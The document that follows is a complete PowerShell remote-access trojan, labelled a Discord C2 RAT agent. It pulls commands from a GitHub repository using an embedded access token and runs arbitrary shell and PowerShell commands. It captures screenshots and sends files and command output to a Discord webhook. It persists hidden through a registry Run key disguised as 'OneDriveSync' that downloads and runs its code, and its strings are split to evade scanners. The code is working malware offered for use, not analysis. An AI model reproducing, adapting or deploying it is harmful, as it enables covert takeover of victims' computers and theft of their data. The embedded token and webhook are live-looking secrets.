# rat.ps1 — Discord C2 RAT agent
# Polls a command file on GitHub raw, executes, reports to a Discord webhook.
# Deployed by the comicstreams HTA (runs hidden, survives via registry Run key).

# ---- Config (strings split to dodge static scanning) ----
$C='https://api.github.com/repos/'+'kaikssaqes/'+'rat/'+'contents/'+'cmd.txt'
$T='ghp_'+'GrrBo1wB58Al0gigScS1HnnjELP6mQ2aOyp5'
$RA='https://raw.githubusercontent.com/'+'kaikssaqes/'+'rat/'+'main/'+'rat.ps1'
$W='https://discord.com/api/webhooks/'+'1550915076586868767/'+'Z1NukXzFi0yUb1kjQdvWti7E_3PQGwHwoYcls0zbclywzZ9YL86NBWem8bVgI5BCSWdo'
$S=Join-Path $env:TEMP 'r_s.tmp'     # last-executed command state
$script:P=2000                       # poll interval (ms)

# ---- HTTP helpers ----
function Post($text){
  try{
    $wc=New-Object Net.WebClient
    $wc.Headers.Add('Content-Type','application/json')
    $b=@{'content'=$text}|ConvertTo-Json -Compress
    [void]$wc.UploadString($W,'POST',$b)
    $wc.Dispose()
  }catch{}
}

function Upload-File($path){
  try{
    $bn=[Guid]::NewGuid().ToString()
    $fb=[IO.File]::ReadAllBytes($path)
    $fn=Split-Path $path -Leaf
    $pre="--$bn`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$fn`"`r`nContent-Type: application/octet-stream`r`n`r`n"
    $post="`r`n--$bn--`r`n"
    $enc=[Text.Encoding]::ASCII
    $body=New-Object byte[] ($enc.GetByteCount($pre)+$fb.Length+$enc.GetByteCount($post))
    [Array]::Copy($enc.GetBytes($pre),0,$body,0,$enc.GetByteCount($pre))
    [Array]::Copy($fb,0,$body,$enc.GetByteCount($pre),$fb.Length)
    [Array]::Copy($enc.GetBytes($post),0,$body,$enc.GetByteCount($pre)+$fb.Length,$enc.GetByteCount($post))
    $req=[Net.HttpWebRequest]::Create($W)
    $req.Method='POST'
    $req.ContentType="multipart/form-data; boundary=$bn"
    $req.ContentLength=$body.Length
    $rs=$req.GetRequestStream()
    $rs.Write($body,0,$body.Length); $rs.Close()
    $resp=$req.GetResponse(); $resp.Close()
  }catch{}
}

function Shot(){
  try{
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    $b=[System.Drawing.Rectangle]::FromLTRB(0,0,[System.Windows.Forms.SystemInformation]::VirtualScreen.Width,[System.Windows.Forms.SystemInformation]::VirtualScreen.Height)
    $bmp=New-Object Drawing.Bitmap $b.Width,$b.Height
    $g=[Drawing.Graphics]::FromImage($bmp)
    $g.CopyFromScreen($b.Location,[Drawing.Point]::Empty,$b.Size)
    $p=Join-Path $env:TEMP ('s_'+[Guid]::NewGuid().ToString('N')+'.png')
    $bmp.Save($p,[Drawing.Imaging.ImageFormat]::Png)
    $g.Dispose(); $bmp.Dispose()
    Upload-File $p
    Remove-Item $p -Force -EA 0
  }catch{}
}

function Persist{
  try{
    $v="powershell -NoP -W Hidden -c IEX(New-Object Net.WebClient).DownloadString('$RA')"
    Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -Value $v
    Post '`[+] persistence enabled`'
  }catch{}
}

function Run-Cmd($c){
  try{
    if($c -eq 'proclist'){
      $o=Get-Process | Sort-Object CPU -Descending | Select-Object -First 30 Name,Id,@{n='CPU';e={[math]::Round($_.CPU,1)}},@{n='MB';e={[math]::Round($_.WS/1MB,1)}} | Out-String -Width 200
      Post $o
    }
    elseif($c -like 'shell:*'){
      $x=$c.Substring(6)
      $o=cmd /c $x 2>&1 | Out-String
      if([string]::IsNullOrWhiteSpace($o)){$o='(no output)'}
      Post $o
    }
    elseif($c -like 'ps:*'){
      $x=$c.Substring(3)
      $o=powershell -NoP -C $x 2>&1 | Out-String
      if([string]::IsNullOrWhiteSpace($o)){$o='(no output)'}
      Post $o
    }
    elseif($c -like 'download:*'){
      $p=$c.Substring(9).Trim()
      if(Test-Path $p){
        if((Get-Item $p).Length -gt 7MB){ Post "`[!] file too large: $p" }
        else{ $d=[Convert]::ToBase64String([IO.File]::ReadAllBytes($p)); Post "`[FILE] $p`n``````$d``````" }
      } else { Post "`[!] not found: $p" }
    }
    elseif($c -eq 'screenshot'){ Shot }
    elseif($c -eq 'persist'){ Persist }
    elseif($c -like 'sleep:*'){
      $script:P=[int]$c.Substring(6)
      Post "`[+] poll set to $($script:P) ms"
    }
    elseif($c -eq 'kill'){
      Post '`[+] killed`'; Remove-Item $S -Force -EA 0; exit
    }
    elseif($c -eq 'uninstall'){
      Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDriveSync' -EA 0
      Post '`[+] uninstalled`'; exit
    }
    elseif($c -eq 'whoami'){ Post (whoami) }
    else { Post "`[?] unknown: $c" }
  }catch{}
}

# ---- main loop ----
Post '`[+] rat online`'
while($true){
  try{
    $wc=New-Object Net.WebClient
    $wc.Headers.Add('User-Agent','Mozilla/5.0')
    $wc.Headers.Add('Accept','application/vnd.github.raw')
    $wc.Headers.Add('Authorization','token '+$T)
    $remote=$wc.DownloadString($C).Trim()
    $wc.Dispose()
    $i=$remote.IndexOf('|')
    if($i -ge 0){ $cmd=$remote.Substring(0,$i).Trim(); $nonce=$remote.Substring($i+1) }
    else{ $cmd=$remote; $nonce=$remote }
    $last=Get-Content $S -Raw -EA SilentlyContinue
    if($cmd -and $nonce -ne $last){
      $nonce | Set-Content $S -Force
      Run-Cmd $cmd
    }
  }catch{}
  Start-Sleep -Milliseconds $script:P
}
